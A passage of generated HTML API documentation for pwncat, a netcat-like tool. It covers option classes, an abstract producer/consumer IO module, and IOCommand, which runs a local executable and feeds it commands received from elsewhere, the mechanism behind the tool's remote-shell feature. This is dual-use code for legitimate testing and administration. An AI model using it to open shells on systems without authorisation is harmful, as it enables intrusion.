                        <dt id="pwncat.DsSock.udp_sconnect_word"><code class="name">var <span
                                class="ident">udp_sconnect_word</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>str</code>: What string to send when
                                emulating a stateful UDP connect.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">udp_sconnect_word</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; str</span>
    <span class="hljs-string">"""`str`: What string to send when emulating a stateful UDP connect."""</span>
    <span class="hljs-keyword">return</span> self.__udp_sconnect_word</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.DsTransformLinefeed"><code class="flex name class">
                    <span>class <span class="ident">DsTransformLinefeed</span></span>
                    <span>(</span><span>crlf)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>A type-safe data structure for DsTransformLinefeed
                        options.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">DsTransformLinefeed</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for DsTransformLinefeed options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">crlf</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
        <span class="hljs-string">"""`bool`: Converts line endings to LF, CRLF or CR and noop on `None`."""</span>
        <span class="hljs-keyword">return</span> self.__crlf

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, crlf</span>):</span>
        <span class="hljs-comment"># type: (Optional[str]) -&gt; None</span>
        super(DsTransformLinefeed, self).__init__()
        self.__crlf = crlf</code></pre>
                    </details>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.DsTransformLinefeed.crlf"><code class="name">var <span
                                class="ident">crlf</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Converts line endings to LF,
                                CRLF or CR and noop on <code>None</code>.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">crlf</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
    <span class="hljs-string">"""`bool`: Converts line endings to LF, CRLF or CR and noop on `None`."""</span>
    <span class="hljs-keyword">return</span> self.__crlf</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.DsTransformSafeword"><code class="flex name class">
                    <span>class <span class="ident">DsTransformSafeword</span></span>
                    <span>(</span><span>ssig, safeword)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>A type-safe data structure for DsTransformSafeword
                        options.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">DsTransformSafeword</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for DsTransformSafeword options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
        <span class="hljs-string">"""`InterruptHandler`: InterruptHandler instance to trigger a shutdown signal."""</span>
        <span class="hljs-keyword">return</span> self.__ssig

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">safeword</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; str</span>
        <span class="hljs-string">"""`str`: The safeword to shutdown the instance upon receiving."""</span>
        <span class="hljs-keyword">return</span> self.__safeword

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, ssig, safeword</span>):</span>
        <span class="hljs-comment"># type: (InterruptHandler, str) -&gt; None</span>
        super(DsTransformSafeword, self).__init__()
        self.__ssig = ssig
        self.__safeword = safeword</code></pre>
                    </details>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.DsTransformSafeword.safeword"><code class="name">var <span
                                class="ident">safeword</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>str</code>: The safeword to shutdown the
                                instance upon receiving.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">safeword</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; str</span>
    <span class="hljs-string">"""`str`: The safeword to shutdown the instance upon receiving."""</span>
    <span class="hljs-keyword">return</span> self.__safeword</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsTransformSafeword.ssig"><code class="name">var <span
                                class="ident">ssig</span></code></dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>:
                                InterruptHandler instance to trigger a shutdown signal.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
    <span class="hljs-string">"""`InterruptHandler`: InterruptHandler instance to trigger a shutdown signal."""</span>
    <span class="hljs-keyword">return</span> self.__ssig</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.IO"><code class="flex name class">
                    <span>class <span class="ident">IO</span></span>
                    <span>(</span><span>ssig)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Abstract class to for pwncat I/O modules.</p>
                        <p>This is a skeleton that defines how the I/O module for pwncat should look
                            like.</p>
                        <p>The "producer" should constantly yield data received from some sort of
                            input
                            which could be user input, output from a shell command data from a
                            socket.</p>
                        <p>The "callback" will apply some sort of action on the data received from a
                            producer
                            which could be output to stdout, send it to the shell or to a
                            socket.</p>
                        <p>"The "interrupts" are a list of funtions that trigger the producer to
                            stop
                            and return to its parent thread/function. The producer must also be
                            implemented
                            in a way that it is able to act on the event which the "interrupt" func
                            emitted.</p>
                        <p>Set specific options for this IO module.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>ssig</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>
                            </dt>
                            <dd>InterruptHandler instance used by the interrupter.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">IO</span>(<span
                                class="hljs-params">ABC</span>):</span>  <span class="hljs-comment"># type: ignore</span>
    <span class="hljs-string">"""Abstract class to for pwncat I/O modules.

    This is a skeleton that defines how the I/O module for pwncat should look like.

    The "producer" should constantly yield data received from some sort of input
    which could be user input, output from a shell command data from a socket.

    The "callback" will apply some sort of action on the data received from a producer
    which could be output to stdout, send it to the shell or to a socket.

    "The "interrupts" are a list of funtions that trigger the producer to stop
    and return to its parent thread/function. The producer must also be implemented
    in a way that it is able to act on the event which the "interrupt" func emitted.
    """</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
        <span class="hljs-string">"""`InterruptHandler`: InterruptHandler instance."""</span>
        <span class="hljs-keyword">return</span> self.__ssig

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; logging.Logger</span>
        <span class="hljs-string">"""`TraceLogger`: Logger instance."""</span>
        <span class="hljs-keyword">return</span> self.__log

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, ssig</span>):</span>
        <span class="hljs-comment"># type: (InterruptHandler) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this IO module.

        Args:
            ssig (InterruptHandler): InterruptHandler instance used by the interrupter.
        """</span>
        super(IO, self).__init__()
        self.__ssig = ssig
        self.__log = logging.getLogger(__name__)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
            class="hljs-params">self, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
        <span class="hljs-string">"""Implement a generator function which constantly yields data.

        The data could be from various sources such as: received from a socket,
        received from user input, received from shell command output or anything else.

        Yields:
            str: Data generated/produced by this function.
        """</span>

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; None</span>
        <span class="hljs-string">"""Define a consumer callback which will apply an action on the producer output.

        Args:
            data (str): Data retrieved from the producer to work on.
        """</span>

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Define an interrupt function which will stop the producer.

        Various producer might call blocking functions and they won't be able to stop themself
        as they hang on that blocking function.
        NOTE: This method is triggered from outside and is supposed to stop/shutdown the producer.
        """</span></code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li>abc.ABC</li>
                    </ul>
                    <h3>Subclasses</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.IOCommand"
                               title="pwncat.IOCommand">IOCommand</a>
                        </li>
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.IONetwork"
                               title="pwncat.IONetwork">IONetwork</a>
                        </li>
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.IONetworkScanner"
                               title="pwncat.IONetworkScanner">IONetworkScanner</a>
                        </li>
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.IOStdinStdout"
                               title="pwncat.IOStdinStdout">IOStdinStdout</a>
                        </li>
                    </ul>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.IO.log"><code class="name">var <span class="ident">log</span></code>
                        </dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.TraceLogger"
                                    title="pwncat.TraceLogger">TraceLogger</a></code>:
                                Logger instance.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; logging.Logger</span>
    <span class="hljs-string">"""`TraceLogger`: Logger instance."""</span>
    <span class="hljs-keyword">return</span> self.__log</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.IO.ssig"><code class="name">var <span
                                class="ident">ssig</span></code></dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>:
                                InterruptHandler instance.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
    <span class="hljs-string">"""`InterruptHandler`: InterruptHandler instance."""</span>
    <span class="hljs-keyword">return</span> self.__ssig</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.IO.consumer"><code class="name flex">
                            <span>def <span
                                    class="ident">consumer</span></span>(<span>self, data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Define a consumer callback which will apply an
                                action on the producer output.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>data</code></strong> :<code>str</code></dt>
                                    <dd>Data retrieved from the producer to work on.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-meta">@abstractmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">consumer</span>(<span class="hljs-params">self, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; None</span>
    <span class="hljs-string">"""Define a consumer callback which will apply an action on the producer output.

    Args:
        data (str): Data retrieved from the producer to work on.
    """</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.IO.interrupt"><code class="name flex">
                            <span>def <span class="ident">interrupt</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Define an interrupt function which will stop the
                                producer.</p>
                                <p>Various producer might call blocking functions and they won't be
                                    able to stop themself
                                    as they hang on that blocking function.
                                    NOTE: This method is triggered from outside and is supposed to
                                    stop/shutdown the producer.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-meta">@abstractmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">interrupt</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Define an interrupt function which will stop the producer.

    Various producer might call blocking functions and they won't be able to stop themself
    as they hang on that blocking function.
    NOTE: This method is triggered from outside and is supposed to stop/shutdown the producer.
    """</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.IO.producer"><code class="name flex">
                            <span>def <span class="ident">producer</span></span>(<span>self, *args, **kwargs)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Implement a generator function which constantly
                                yields data.</p>
                                <p>The data could be from various sources such as: received from a
                                    socket,
                                    received from user input, received from shell command output or
                                    anything else.</p>
                                <h2 id="yields">Yields</h2>
                                <dl>
                                    <dt><code>str</code></dt>
                                    <dd>Data generated/produced by this function.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-meta">@abstractmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">producer</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span>
    <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
    <span class="hljs-string">"""Implement a generator function which constantly yields data.

    The data could be from various sources such as: received from a socket,
    received from user input, received from shell command output or anything else.

    Yields:
        str: Data generated/produced by this function.
    """</span></code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.IOCommand"><code class="flex name class">
                    <span>class <span class="ident">IOCommand</span></span>
                    <span>(</span><span>ssig, opts)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Implement command execution functionality.</p>
                        <h2 id="attributes">Attributes</h2>
                        <dl>
                            <dt><strong><code>proc</code></strong> :<code>subprocess.Popen</code>
                            </dt>
                            <dd>subprocess.Popen instance.</dd>
                        </dl>
                        <p>Set specific options for this I/O module.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>ssig</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>
                            </dt>
                            <dd>Instance of InterruptHandler.</dd>
                            <dt><strong><code>opts</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsIOCommand"
                                    title="pwncat.DsIOCommand">DsIOCommand</a></code>
                            </dt>
                            <dd>Custom module options.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span
                                class="hljs-title">IOCommand</span>(<span
                                class="hljs-params">IO</span>):</span>
    <span class="hljs-string">"""Implement command execution functionality.

    Attributes:
        proc (subprocess.Popen): subprocess.Popen instance.
    """</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, ssig, opts</span>):</span>
        <span class="hljs-comment"># type: (InterruptHandler, DsIOCommand) -&gt; None</span>
        <span class="hljs-string">"""Set specific options for this I/O module.

        Args:
            ssig (InterruptHandler): Instance of InterruptHandler.
            opts (DsIOCommand): Custom module options.
        """</span>
        super(IOCommand, self).__init__(ssig)
        self.__opts = opts
        self.log.debug(<span class="hljs-string">"Setting '%s' as executable"</span>, self.__opts.executable)

        <span class="hljs-comment"># Did we already run cleanup</span>
        self.__cleaned_up = <span class="hljs-literal">False</span>

        <span class="hljs-comment"># If we receive only one byte at a time, the remote end is most likely</span>
        <span class="hljs-comment"># in raw mode and we will also start sending one byte at a time.</span>
        <span class="hljs-comment"># This will be determined in the consumer and action is taken in</span>
        <span class="hljs-comment"># the producer.</span>
        self.__remote_is_raw = <span class="hljs-literal">False</span>

        <span class="hljs-comment"># Open executable to wait for commands</span>
        env = os.environ.copy()
        <span class="hljs-keyword">try</span>:
            self.proc = Popen(  <span
                                    class="hljs-comment"># pylint: disable=consider-using-with</span>
                self.__opts.executable,
                stdin=PIPE,
                stdout=PIPE,
                stderr=STDOUT,
                bufsize=self.__opts.bufsize,
                shell=<span class="hljs-literal">False</span>,
                env=env,
            )
        <span class="hljs-keyword">except</span> FileNotFoundError:
            self.log.error(<span class="hljs-string">"Specified executable '%s' not found"</span>, self.__opts.executable)
            sys.exit(<span class="hljs-number">1</span>)
        <span class="hljs-comment"># Python-2 compat (doesn't have FileNotFoundError)</span>
        <span class="hljs-keyword">except</span> OSError:
            self.log.error(<span class="hljs-string">"Specified executable '%s' not found"</span>, self.__opts.executable)
            sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
            class="hljs-params">self, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
        <span class="hljs-string">"""Constantly ask for input.

        Yields:
            str: Data received from command output.
        """</span>
        <span class="hljs-keyword">assert</span> self.proc.stdout <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">if</span> self.ssig.has_command_quit():
                self.log.trace(<span class="hljs-string">"COMMAND-QUIT signal ACK IOCommand.producer (1)"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
                self.__cleanup()
                <span class="hljs-keyword">return</span>
            self.log.trace(<span class="hljs-string">"Reading command output"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
            <span class="hljs-comment"># Byte-wise reading is required to make it work for remote ends being in raw mode</span>
            <span class="hljs-comment"># However, the performance of self.proc.stdout.readline() is way faster.</span>
            <span class="hljs-comment"># To improve performance we will get rid of all other logging calls here.</span>
            <span class="hljs-keyword">if</span> self.__remote_is_raw:
                data = self.proc.stdout.read(<span class="hljs-number">1</span>)
            <span class="hljs-keyword">else</span>:
                data = self.proc.stdout.readline()
            self.log.trace(<span class="hljs-string">"Command output: %s"</span>, repr(data))  <span
                                    class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:
                <span class="hljs-keyword">if</span> self.ssig.has_command_quit():
                    self.log.trace(<span class="hljs-string">"COMMAND-QUIT signal ACK IOCommand.producer (2)"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
                    self.__cleanup()
                    <span class="hljs-keyword">return</span>
                <span class="hljs-comment"># This usually happens when sending a semicolon only to /bin/[ba]sh</span>
                <span class="hljs-comment"># which then responds with: /bin/sh: line 5: syntax error near unexpected token `;'</span>
                <span class="hljs-comment"># Afterwards the shell is corrupt and gone so we will restart it here.</span>
                self.log.error(<span class="hljs-string">"COMMAND-EOF restarting: %s"</span>, self.__opts.executable)
                self.proc = Popen(  <span
                                    class="hljs-comment"># pylint: disable=consider-using-with</span>
                    self.__opts.executable,
                    stdin=PIPE,
                    stdout=PIPE,
                    stderr=STDOUT,
                    bufsize=self.__opts.bufsize,
                    shell=<span class="hljs-literal">False</span>,
                    env=os.environ.copy(),
                )
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">yield</span> data

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
            class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; None</span>
        <span class="hljs-string">"""Send data received to stdin (command input).

        Args:
            data (str): Command to execute.
        """</span>
        <span class="hljs-comment"># If we only receive one byte at a time, also tell the consumer</span>
        <span class="hljs-comment"># to send one byte at a time immediately and not to wait for a full line.</span>
        <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">1</span>:
            self.__remote_is_raw = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">else</span>:
            self.__remote_is_raw = <span class="hljs-literal">False</span>

        <span class="hljs-keyword">assert</span> self.proc.stdin <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>
        self.log.trace(<span class="hljs-string">"Appending to stdin: %s"</span>, repr(data))  <span
                                    class="hljs-comment"># type: ignore</span>
        <span class="hljs-keyword">try</span>:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()
        <span class="hljs-keyword">except</span> BrokenPipeError:
            <span class="hljs-keyword">pass</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Stop function that can be called externally to close this instance."""</span>
        self.log.trace(<span class="hljs-string">"COMMAND-QUIT signal RAISED IOCommand.interrupt"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>
        self.ssig.raise_command_quit()
        self.__cleanup()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__cleanup</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Cleanup function."""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__cleaned_up:
            self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                <span class="hljs-string">"COMMAND-QUIT-CLEANUP: killing executable: %s with pid %d"</span>,
                self.__opts.executable,
                self.proc.pid,
            )
            self.proc.kill()
            self.__cleaned_up = <span class="hljs-literal">True</span></code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.IO"
                               title="pwncat.IO">IO</a></li>
                        <li>abc.ABC</li>
                    </ul>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.IOCommand.consumer"><code class="name flex">
                            <span>def <span
                                    class="ident">consumer</span></span>(<span>self, data)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Send data received to stdin (command input).</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>data</code></strong> :<code>str</code></dt>
                                    <dd>Command to execute.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
                                        class="hljs-params">self, data</span>):</span>
    <span class="hljs-comment"># type: (bytes) -&gt; None</span>
    <span class="hljs-string">"""Send data received to stdin (command input).

    Args:
        data (str): Command to execute.
    """</span>
    <span class="hljs-comment"># If we only receive one byte at a time, also tell the consumer</span>
    <span class="hljs-comment"># to send one byte at a time immediately and not to wait for a full line.</span>
    <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">1</span>:
        self.__remote_is_raw = <span class="hljs-literal">True</span>
    <span class="hljs-keyword">else</span>:
        self.__remote_is_raw = <span class="hljs-literal">False</span>

    <span class="hljs-keyword">assert</span> self.proc.stdin <span
                                            class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span>
    self.log.trace(<span class="hljs-string">"Appending to stdin: %s"</span>, repr(data))  <span
                                            class="hljs-comment"># type: ignore</span>
    <span class="hljs-keyword">try</span>:
        self.proc.stdin.write(data)
        self.proc.stdin.flush()
    <span class="hljs-keyword">except</span> BrokenPipeError:
        <span class="hljs-keyword">pass</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.IOCommand.interrupt"><code class="name flex">
                            <span>def <span class="ident">interrupt</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Stop function that can be called externally to
                                close this instance.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">interrupt</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Stop function that can be called externally to close this instance."""</span>
    self.log.trace(<span class="hljs-string">"COMMAND-QUIT signal RAISED IOCommand.interrupt"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
    self.ssig.raise_command_quit()
    self.__cleanup()</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.IOCommand.producer"><code class="name flex">
                            <span>def <span class="ident">producer</span></span>(<span>self, *args, **kwargs)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Constantly ask for input.</p>
                                <h2 id="yields">Yields</h2>
                                <dl>
                                    <dt><code>str</code></dt>
                                    <dd>Data received from command output.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
                                        class="hljs-params">self, *args, **kwargs</span>):</span>
    <span class="hljs-comment"># type: (Any, Any) -&gt; Iterator[bytes]</span>
    <span class="hljs-string">"""Constantly ask for input.

    Yields:
        str: Data received from command output.
    """</span>
    <span class="hljs-keyword">assert</span> self.proc.stdout <span
                                            class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">if</span> self.ssig.has_command_quit():
            self.log.trace(<span class="hljs-string">"COMMAND-QUIT signal ACK IOCommand.producer (1)"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
            self.__cleanup()
            <span class="hljs-keyword">return</span>
        self.log.trace(<span class="hljs-string">"Reading command output"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
        <span class="hljs-comment"># Byte-wise reading is required to make it work for remote ends being in raw mode</span>
        <span class="hljs-comment"># However, the performance of self.proc.stdout.readline() is way faster.</span>
        <span class="hljs-comment"># To improve performance we will get rid of all other logging calls here.</span>
        <span class="hljs-keyword">if</span> self.__remote_is_raw:
            data = self.proc.stdout.read(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">else</span>:
